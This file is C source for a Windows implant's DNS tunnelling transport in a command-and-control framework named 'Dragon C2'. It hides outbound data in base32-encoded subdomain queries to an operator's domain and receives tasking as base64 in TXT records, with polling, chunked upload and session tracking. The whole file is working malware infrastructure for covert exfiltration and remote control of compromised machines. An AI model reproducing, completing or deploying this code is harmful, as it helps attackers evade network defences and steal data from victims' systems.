#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#include "transport.h"

/* =========================================================================
 * DNS Transport for Dragon C2
 *
 * Tunnels C2 traffic inside standard DNS queries/responses.
 * Client (Windows) sends data encoded in subdomain labels and receives
 * data from TXT records (base64) or A records (4 bytes each).
 *
 * Protocol:
 *   POLL:     <nonce>.<session>.p.<domain>        -> A query
 *   UPLOAD:   <b32data>.<idx>.<tot>.<session>.u.<domain>  -> A query
 *   DOWNLOAD: <seq>.<session>.d.<domain>          -> TXT query
 *
 * Response:
 *   POLL A:   0.0.0.0 = no data, 0.0.0.1 = data waiting
 *   UPLOAD A: 0.0.0.<next_idx> = ACK
 *   DOWNLOAD TXT: base64 encoded payload (or "NODATA")
 * ====================================================================== */


/* =========================================================================
 * Configurable globals (malleable profile / build-time)
 * ====================================================================== */

char g_dns_domain[256]  = "";           /* C2 domain - MUST be set       */
int  g_dns_poll_ms      = 3000;         /* polling interval (ms)         */
int  g_dns_record_mode  = 0;            /* 0=hybrid 1=A-only 2=TXT-only  */

#define DNS_PORT              53
#define DNS_MAX_PACKET        512        /* standard DNS UDP max          */
#define DNS_QUERY_TIMEOUT_MS  5000       /* per-query UDP timeout         */
#define DNS_MAX_RETRIES       3          /* retries per query             */
#define DNS_MAX_LABEL         63         /* max bytes per DNS label       */
#define DNS_MAX_NAME          253        /* max total domain name         */
#define DNS_MAX_DATA_PER_Q    120        /* raw bytes per upload query    */
#define DNS_MAX_TXT_DATA      255        /* max TXT rdata string len      */
#define DNS_RX_BUFSZ          4096       /* receive reassembly buffer     */

/* DNS record types */
#define DNS_TYPE_A   1
#define DNS_TYPE_TXT 16

/* DNS header flags */
#define DNS_FLAG_RD  0x0100   /* Recursion Desired */


/* =========================================================================
 * Base32 encoding (RFC 4648 lowercase: a-z, 2-7)
 *
 * Used to encode binary data in DNS subdomain labels.
 * ====================================================================== */

static const char b32_alpha[] = "abcdefghijklmnopqrstuvwxyz234567";

static int b32_encode(const uint8_t *in, size_t inlen,
                      char *out, size_t outmax)
{
    size_t oi = 0;
    int    bits = 0;
    uint32_t accum = 0;

    for (size_t i = 0; i < inlen; i++) {
        accum = (accum << 8) | in[i];
        bits += 8;
        while (bits >= 5) {
            bits -= 5;
            if (oi >= outmax - 1) return -1;
            out[oi++] = b32_alpha[(accum >> bits) & 0x1F];
        }
    }
    if (bits > 0) {
        if (oi >= outmax - 1) return -1;
        out[oi++] = b32_alpha[(accum << (5 - bits)) & 0x1F];
    }
    out[oi] = '\0';
    return (int)oi;
}

/* =========================================================================
 * Base32 decoding
 * ====================================================================== */

static int b32_decode(const char *in, size_t inlen,
                      uint8_t *out, size_t outmax)
{
    size_t oi = 0;
    int    bits = 0;
    uint32_t accum = 0;

    for (size_t i = 0; i < inlen; i++) {
        int val;
        char c = in[i];
        if (c >= 'a' && c <= 'z')      val = c - 'a';
        else if (c >= 'A' && c <= 'Z') val = c - 'A';
        else if (c >= '2' && c <= '7') val = c - '2' + 26;
        else if (c == '=')             continue;
        else                           return -1;

        accum = (accum << 5) | val;
        bits += 5;
        if (bits >= 8) {
            bits -= 8;
            if (oi >= outmax) return -1;
            out[oi++] = (uint8_t)((accum >> bits) & 0xFF);
        }
    }
    return (int)oi;
}


/* =========================================================================
 * Base64 decoding
 * ====================================================================== */

static int b64_val(char c)
{
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

static int b64_decode(const char *in, size_t inlen,
                      uint8_t *out, size_t outmax)
{
    size_t oi = 0;
    uint32_t accum = 0;
    int bits = 0;

    for (size_t i = 0; i < inlen; i++) {
        if (in[i] == '=' || in[i] == '\r' || in[i] == '\n') continue;
        int v = b64_val(in[i]);
        if (v < 0) return -1;
        accum = (accum << 6) | v;
        bits += 6;
        if (bits >= 8) {
            bits -= 8;
            if (oi >= outmax) return -1;
            out[oi++] = (uint8_t)((accum >> bits) & 0xFF);
        }
    }
    return (int)oi;
}

static const char b64_alpha[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

/* =========================================================================
 * Base64 encoding
 * ====================================================================== */
static int b64_encode(const uint8_t *in, size_t inlen,
                      char *out, size_t outmax)
{
    size_t oi = 0;
    size_t i;
    for (i = 0; i + 2 < inlen; i += 3) {
        if (oi + 4 >= outmax) return -1;
        uint32_t v = ((uint32_t)in[i] << 16) | ((uint32_t)in[i+1] << 8) | in[i+2];
        out[oi++] = b64_alpha[(v >> 18) & 0x3F];
        out[oi++] = b64_alpha[(v >> 12) & 0x3F];
        out[oi++] = b64_alpha[(v >>  6) & 0x3F];
        out[oi++] = b64_alpha[ v        & 0x3F];
    }
    if (i < inlen) {
        if (oi + 4 >= outmax) return -1;
        uint32_t v = (uint32_t)in[i] << 16;
        if (i + 1 < inlen) v |= (uint32_t)in[i+1] << 8;
        out[oi++] = b64_alpha[(v >> 18) & 0x3F];
        out[oi++] = b64_alpha[(v >> 12) & 0x3F];
        out[oi++] = (i + 1 < inlen) ? b64_alpha[(v >> 6) & 0x3F] : '=';
        out[oi++] = '=';
    }
    out[oi] = '\0';
    return (int)oi;
}


/* =========================================================================
 * DNS format helpers
 * ====================================================================== */

/* Encode a dotted domain name into DNS wire format (length-prefixed labels). */
static int dns_encode_name(const char *name, uint8_t *buf, size_t bufmax)
{
    size_t pos = 0;
    const char *p = name;

    while (*p) {
        const char *dot = strchr(p, '.');
        size_t label_len = dot ? (size_t)(dot - p) : strlen(p);

        if (label_len > 63 || label_len == 0) return -1;
        if (pos + 1 + label_len >= bufmax) return -1;

        buf[pos++] = (uint8_t)label_len;
        memcpy(buf + pos, p, label_len);
        pos += label_len;

        p += label_len;
        if (*p == '.') p++;
    }
    if (pos >= bufmax) return -1;
    buf[pos++] = 0; 
    return (int)pos;
}

/* Build a DNS query packet. */
static int dns_build_query(uint8_t *pkt, size_t pktmax,
                           const char *qname, uint16_t qtype,
                           uint16_t txid)
{
    if (pktmax < 12) return -1;

    /* Header */
    memset(pkt, 0, 12);
    pkt[0] = (uint8_t)(txid >> 8);
    pkt[1] = (uint8_t)(txid & 0xFF);
    /* Flags: standard query, RD=1 */
    pkt[2] = 0x01;  /* RD */
    pkt[3] = 0x00;
    /* QDCOUNT = 1 */
    pkt[4] = 0; pkt[5] = 1;

    /* Question */
    int nlen = dns_encode_name(qname, pkt + 12, pktmax - 12 - 4);
    if (nlen < 0) return -1;

    int off = 12 + nlen;
    if (off + 4 > (int)pktmax) return -1;

    /* QTYPE */
    pkt[off++] = (uint8_t)(qtype >> 8);
    pkt[off++] = (uint8_t)(qtype & 0xFF);
    /* QCLASS = IN */
    pkt[off++] = 0;
    pkt[off++] = 1;

    return off;
}

static int dns_skip_name(const uint8_t *pkt, int pktlen, int off)
{
    while (off < pktlen) {
        uint8_t len = pkt[off];
        if (len == 0) return off + 1;
        if ((len & 0xC0) == 0xC0) return off + 2; 
        off += 1 + len;
    }
    return -1;
}

/* Parse A records from DNS response. */
static int dns_parse_a_records(const uint8_t *pkt, int pktlen,
                               uint32_t *addrs, int max_addrs)
{
    if (pktlen < 12) return -1;

    uint16_t qdcount = ((uint16_t)pkt[4] << 8) | pkt[5];
    uint16_t ancount = ((uint16_t)pkt[6] << 8) | pkt[7];

    int off = 12;
    for (int i = 0; i < qdcount; i++) {
        off = dns_skip_name(pkt, pktlen, off);
        if (off < 0 || off + 4 > pktlen) return -1;
        off += 4;  /* QTYPE + QCLASS */
    }

    int count = 0;
    for (int i = 0; i < ancount && off < pktlen; i++) {
        off = dns_skip_name(pkt, pktlen, off);
        if (off < 0 || off + 10 > pktlen) return -1;

        uint16_t rtype = ((uint16_t)pkt[off] << 8) | pkt[off+1];
        uint16_t rdlen = ((uint16_t)pkt[off+8] << 8) | pkt[off+9];
        off += 10;

        if (off + rdlen > pktlen) return -1;

        if (rtype == DNS_TYPE_A && rdlen == 4 && count < max_addrs) {
            memcpy(&addrs[count], pkt + off, 4);
            count++;
        }
        off += rdlen;
    }
    return count;
}

/* Parse TXT records from DNS response. */
static int dns_parse_txt_records(const uint8_t *pkt, int pktlen,
                                  char *out, size_t outmax)
{
    if (pktlen < 12) return -1;

    uint16_t qdcount = ((uint16_t)pkt[4] << 8) | pkt[5];
    uint16_t ancount = ((uint16_t)pkt[6] << 8) | pkt[7];

    int off = 12;
    for (int i = 0; i < qdcount; i++) {
        off = dns_skip_name(pkt, pktlen, off);
        if (off < 0 || off + 4 > pktlen) return -1;
        off += 4;
    }

    size_t total = 0;
    for (int i = 0; i < ancount && off < pktlen; i++) {
        off = dns_skip_name(pkt, pktlen, off);
        if (off < 0 || off + 10 > pktlen) return -1;

        uint16_t rtype = ((uint16_t)pkt[off] << 8) | pkt[off+1];
        uint16_t rdlen = ((uint16_t)pkt[off+8] << 8) | pkt[off+9];
        off += 10;

        if (off + rdlen > pktlen) return -1;

        if (rtype == DNS_TYPE_TXT) {
            int end = off + rdlen;
            while (off < end) {
                uint8_t slen = pkt[off++];
                if (off + slen > end) break;
                if (total + slen >= outmax) break;
                memcpy(out + total, pkt + off, slen);
                total += slen;
                off += slen;
            }
        }
        off += 0; 
    }
    if (total < outmax) out[total] = '\0';
    return (int)total;
}


/* =========================================================================
 * Transport connection state
 * ====================================================================== */

struct transport_conn {
    SOCKET sock;                    /* UDP socket to DNS server         */
    struct sockaddr_in dns_addr;    /* DNS server address               */
    uint32_t session_id;            /* random session identifier        */
    uint16_t tx_seq;                /* upload sequence counter          */
    uint16_t rx_seq;                /* download sequence counter        */
    uint16_t txid_counter;          /* DNS transaction ID counter       */

    /* Receive reassembly buffer */
    uint8_t  rx_buf[DNS_RX_BUFSZ];
    size_t   rx_len;                /* total data available             */
    size_t   rx_pos;                /* bytes already consumed by caller */
};


/* =========================================================================
 * Low-level DNS query: send query, receive response
 * ====================================================================== */

static int dns_query_raw(transport_conn_t *conn,
                         const char *qname, uint16_t qtype,
                         uint8_t *resp, size_t respmax)
{
    uint8_t query[DNS_MAX_PACKET];
    uint16_t txid = conn->txid_counter++;

    int qlen = dns_build_query(query, sizeof(query), qname, qtype, txid);
    if (qlen < 0) {
        fprintf(stderr, "[DNS] failed to build query for %s\n", qname);
        return -1;
    }

    DWORD timeout = DNS_QUERY_TIMEOUT_MS;
    setsockopt(conn->sock, SOL_SOCKET, SO_RCVTIMEO,
               (const char *)&timeout, sizeof(timeout));

    for (int attempt = 0; attempt < DNS_MAX_RETRIES; attempt++) {
        int sent = sendto(conn->sock, (const char *)query, qlen, 0,
                          (struct sockaddr *)&conn->dns_addr,
                          sizeof(conn->dns_addr));
        if (sent != qlen) {
            fprintf(stderr, "[DNS] sendto failed: %d\n", WSAGetLastError());
            continue;
        }

        struct sockaddr_in from;
        int fromlen = sizeof(from);
        int rlen = recvfrom(conn->sock, (char *)resp, (int)respmax, 0,
                            (struct sockaddr *)&from, &fromlen);

        if (rlen <= 0) continue;

        if (rlen >= 2) {
            uint16_t resp_txid = ((uint16_t)resp[0] << 8) | resp[1];
            if (resp_txid != txid) continue;
        }

        return rlen;
    }

    return -1;  /* all retries exhausted */
}


/* =========================================================================
 * Protocol helpers
 * ====================================================================== */

static void hex8(uint32_t val, char *out)
{
    snprintf(out, 9, "%08x", val);
}

static void hex4(uint16_t val, char *out)
{
    snprintf(out, 5, "%04x", val);
}


/* =========================================================================
 * POLL - check if server has data for us
 *
 * Query:  <nonce_hex>.<session_hex>.p.<domain>  (A record)
 * Response:
 *   A = 0.0.0.0 -> no data
 *   A = 0.0.0.1 -> data waiting, fetch with TXT
 *   other       -> error
 * ====================================================================== */

static int dns_do_poll(transport_conn_t *conn)
{
    char nonce[9], sess[9];
    hex8((uint32_t)rand(), nonce);
    hex8(conn->session_id, sess);

    char qname[DNS_MAX_NAME];
    snprintf(qname, sizeof(qname), "%s.%s.p.%s",
             nonce, sess, g_dns_domain);

    uint8_t resp[DNS_MAX_PACKET];
    int rlen = dns_query_raw(conn, qname, DNS_TYPE_A, resp, sizeof(resp));
    if (rlen < 0) return -1;

    uint32_t addrs[4];
    int naddrs = dns_parse_a_records(resp, rlen, addrs, 4);
    if (naddrs <= 0) return 0;


    uint8_t *ip = (uint8_t *)&addrs[0];
    if (ip[0] == 0 && ip[1] == 0 && ip[2] == 0 && ip[3] == 1)
        return 1; 

    return 0;
}


/* =========================================================================
 * UPLOAD - send data from client to server via subdomain labels
 *
 * Splits data into chunks, each encoded as base32 in subdomain labels.
 * One DNS query per chunk. Waits for ACK after each.
 *
 * Query: <b32_label1>.<b32_label2>.<idx_hex>.<tot_hex>.<session>.u.<domain>
 * Response: A record (ACK)
 * ====================================================================== */

static int dns_do_upload(transport_conn_t *conn,
                         const uint8_t *data, size_t len)
{
    if (len == 0) return 0;
    size_t domain_len = strlen(g_dns_domain);
    size_t overhead = 22 + domain_len;
    size_t avail_chars = (DNS_MAX_NAME > overhead + 10) ?
                         DNS_MAX_NAME - overhead - 10 : 60;

    int n_labels = (int)(avail_chars / 64) + 1;
    if (n_labels > 3) n_labels = 3;
    size_t raw_per_query = (size_t)(n_labels * 39);
    if (raw_per_query > DNS_MAX_DATA_PER_Q)
        raw_per_query = DNS_MAX_DATA_PER_Q;

    /* Number of chunks */
    uint16_t total_chunks = (uint16_t)((len + raw_per_query - 1) / raw_per_query);

    for (uint16_t idx = 0; idx < total_chunks; idx++) {
        size_t chunk_off = idx * raw_per_query;
        size_t chunk_len = len - chunk_off;
        if (chunk_len > raw_per_query) chunk_len = raw_per_query;

        /* Base32 encode the chunk */
        char b32[256];
        int b32len = b32_encode(data + chunk_off, chunk_len, b32, sizeof(b32));
        if (b32len < 0) return -1;

        char labels[256];
        int lpos = 0;
        for (int i = 0; i < b32len; i++) {
            if (i > 0 && (i % DNS_MAX_LABEL) == 0)
                labels[lpos++] = '.';
            labels[lpos++] = b32[i];
        }
        labels[lpos] = '\0';

        char idx_hex[5], tot_hex[5], sess[9];
        hex4(idx, idx_hex);
        hex4(total_chunks, tot_hex);
        hex8(conn->session_id, sess);

        char qname[DNS_MAX_NAME + 64];
        snprintf(qname, sizeof(qname), "%s.%s.%s.%s.u.%s",
                 labels, idx_hex, tot_hex, sess, g_dns_domain);

        uint8_t resp[DNS_MAX_PACKET];
        int rlen = dns_query_raw(conn, qname, DNS_TYPE_A, resp, sizeof(resp));
        if (rlen < 0) {
            fprintf(stderr, "[DNS] upload chunk %d/%d failed\n",
                    idx + 1, total_chunks);
            return -1;
        }

        conn->tx_seq++;
    }

    return (int)len;
}


/* =========================================================================
 * DOWNLOAD - receive data from server via TXT records
 *
 * Query: <seq_hex>.<session>.d.<domain>   (TXT query)
 * Response: TXT record with base64 payload, or "NODATA"
 *
 * Fetches one TXT record at a time, stores decoded data in rx_buf.
 * ====================================================================== */

static int dns_do_download(transport_conn_t *conn)
{
    char seq[5], sess[9];
    hex4(conn->rx_seq, seq);
    hex8(conn->session_id, sess);

    char qname[DNS_MAX_NAME];
    snprintf(qname, sizeof(qname), "%s.%s.d.%s",
             seq, sess, g_dns_domain);

    uint8_t resp[DNS_MAX_PACKET];
    int rlen = dns_query_raw(conn, qname, DNS_TYPE_TXT, resp, sizeof(resp));
    if (rlen < 0) return -1;

    char txt[512];
    int txtlen = dns_parse_txt_records(resp, rlen, txt, sizeof(txt));
    if (txtlen <= 0) return 0;

    if (txtlen == 6 && memcmp(txt, "NODATA", 6) == 0)
        return 0;

    size_t space = DNS_RX_BUFSZ - conn->rx_len;
    if (space == 0) return 0;

    int decoded = b64_decode(txt, (size_t)txtlen,
                             conn->rx_buf + conn->rx_len, space);
    if (decoded < 0) {
        fprintf(stderr, "[DNS] base64 decode failed\n");
        return -1;
    }

    conn->rx_len += (size_t)decoded;
    conn->rx_seq++;
    return decoded;
}


/* =========================================================================
 * Transport vtable: connect
 *
 * host = DNS server IP or system resolver
 * port = DNS server port
 * ====================================================================== */

static transport_conn_t *dns_connect(const char *host, int port)
{
    if (g_dns_domain[0] == '\0') {
        fprintf(stderr, "[DNS] g_dns_domain not set!\n");
        return NULL;
    }

    if (port <= 0) port = DNS_PORT;

    SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock == INVALID_SOCKET) {
        fprintf(stderr, "[DNS] socket() failed: %d\n", WSAGetLastError());
        return NULL;
    }

    struct sockaddr_in dns_addr;
    memset(&dns_addr, 0, sizeof(dns_addr));
    dns_addr.sin_family = AF_INET;
    dns_addr.sin_port = htons((u_short)port);
    inet_pton(AF_INET, host, &dns_addr.sin_addr);

    /* Generate random session ID */
    srand((unsigned int)(GetTickCount() ^ GetCurrentProcessId()));
    uint32_t session_id = ((uint32_t)rand() << 16) | (uint32_t)rand();

    transport_conn_t *conn = calloc(1, sizeof(*conn));
    if (!conn) { closesocket(sock); return NULL; }

    conn->sock = sock;
    conn->dns_addr = dns_addr;
    conn->session_id = session_id;
    conn->tx_seq = 0;
    conn->rx_seq = 0;
    conn->txid_counter = (uint16_t)(rand() & 0xFFFF);
    conn->rx_len = 0;
    conn->rx_pos = 0;

    printf("[DNS] connected: server=%s:%d domain=%s session=%08x\n",
           host, port, g_dns_domain, session_id);

    return conn;
}


/* =========================================================================
 * Transport vtable: send
 * ====================================================================== */

static int dns_send(transport_conn_t *conn,
                    const uint8_t *buf, size_t len)
{
    if (!conn || !buf || len == 0) return -1;
    return dns_do_upload(conn, buf, len);
}


/* =========================================================================
 * Transport vtable: recv
 * ====================================================================== */

static int dns_recv(transport_conn_t *conn,
                    uint8_t *buf, size_t len)
{
    if (!conn || !buf || len == 0) return -1;

    size_t total = 0;

    while (total < len) {
        size_t avail = conn->rx_len - conn->rx_pos;
        if (avail > 0) {
            size_t want = len - total;
            if (want > avail) want = avail;
            memcpy(buf + total, conn->rx_buf + conn->rx_pos, want);
            conn->rx_pos += want;
            total += want;

            if (conn->rx_pos >= conn->rx_len) {
                conn->rx_len = 0;
                conn->rx_pos = 0;
            }
            continue;
        }

        int has_data = dns_do_poll(conn);
        if (has_data < 0) return -1;

        if (has_data > 0) {
            int got = dns_do_download(conn);
            if (got < 0) return -1;
            if (got > 0) continue;
        }

        Sleep((DWORD)g_dns_poll_ms);
    }

    return (int)total;
}


/* =========================================================================
 * Transport vtable: poll
 * ====================================================================== */

static int dns_poll(transport_conn_t *conn, int timeout_ms)
{
    if (!conn) return -1;

    if (conn->rx_pos < conn->rx_len)
        return 1;

    int has_data = dns_do_poll(conn);
    if (has_data > 0) {
        dns_do_download(conn);
        return 1;
    }

    return has_data;
}


/* =========================================================================
 * Transport vtable: close
 * ====================================================================== */

static void dns_close(transport_conn_t *conn)
{
    if (!conn) return;
    if (conn->sock != INVALID_SOCKET)
        closesocket(conn->sock);
    free(conn);
}


/* =========================================================================
 * Transport vtable: listen / accept / close_listener
 * ====================================================================== */

static int dns_listen(int port)
{
    (void)port;
    fprintf(stderr, "[DNS] listen not supported (DNS is client->server only)\n");
    return -1;
}

static transport_conn_t *dns_accept(int listener_fd,
                                     struct sockaddr_in *out_addr)
{
    (void)listener_fd;
    (void)out_addr;
    return NULL;
}

static void dns_close_listener(int listener_fd)
{
    (void)listener_fd;
}

static int dns_get_fd(transport_conn_t *conn)
{
    (void)conn;
    return -1;
}


/* =========================================================================
 * Transport Registration
 * ====================================================================== */

transport_t TRANSPORT_DNS = {
    .name           = "dns",
    .listen         = dns_listen,
    .connect        = dns_connect,
    .accept         = dns_accept,
    .send           = dns_send,
    .recv           = dns_recv,
    .poll           = dns_poll,
    .close          = dns_close,
    .close_listener = dns_close_listener,
    .get_fd         = dns_get_fd,
};